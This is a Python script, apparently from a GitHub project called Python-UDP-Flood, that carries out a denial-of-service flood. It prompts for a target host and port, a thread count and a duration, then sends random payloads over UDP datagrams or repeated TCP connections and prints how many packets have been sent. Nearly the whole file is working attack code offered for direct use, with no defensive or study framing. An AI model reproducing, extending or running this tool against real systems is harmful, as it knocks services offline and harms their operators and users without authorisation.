import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name

print("\033[1;34;40m \n")
os.system("figlet Hello -f slant")
print("\033[1;33;40m If you have any issue post a thread on https://github.com/XaviFortes/Python-UDP-Flood/issues\n")

print("\033[1;32;40m ==> Code by Karasu <==  \n")
test = input()
if test == "n":
    exit(0)

ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
duration = int(input(" Time in seconds to run attack: "))

stop_event = threading.Event()
counters = [0] * threads  # contador por hilo

def run(idx):
    data = random._urandom(1024)
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(data, addr)
                counters[idx] += 1
        except Exception:
            s.close()

def run2(idx):
    data = random._urandom(16)
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
                counters[idx] += 1
        except Exception:
            s.close()

def attack_threads():
    thread_list = []
    for y in range(threads):
        if choice == 'y':
            th = threading.Thread(target=run, args=(y,))
        else:
            th = threading.Thread(target=run2, args=(y,))
        th.start()
        thread_list.append(th)
    return thread_list

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

def byebye():
    clear()
    os.system("figlet Youre Leaving Sir -f slant")
    sys.exit(130)

def exit_gracefully(signum, frame):
    signal.signal(signal.SIGINT, original_sigint)
    try:
        exitc = str(input(" You wanna exit bby <3 ?:"))
        if exitc == 'y':
            byebye()
    except KeyboardInterrupt:
        print("Ok ok")
        byebye()
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)

    threads_list = attack_threads()
    print(f"Attack running for {duration} seconds...")
    start = time.time()
    while time.time() - start < duration:
        time.sleep(1)
        total = sum(counters)
        print(f"\rTotal packets sent: {total}", end='', flush=True)
    stop_event.set()
    for th in threads_list:
        th.join()
    print(f"\nAttack finished. Total packets sent: {sum(counters)}")
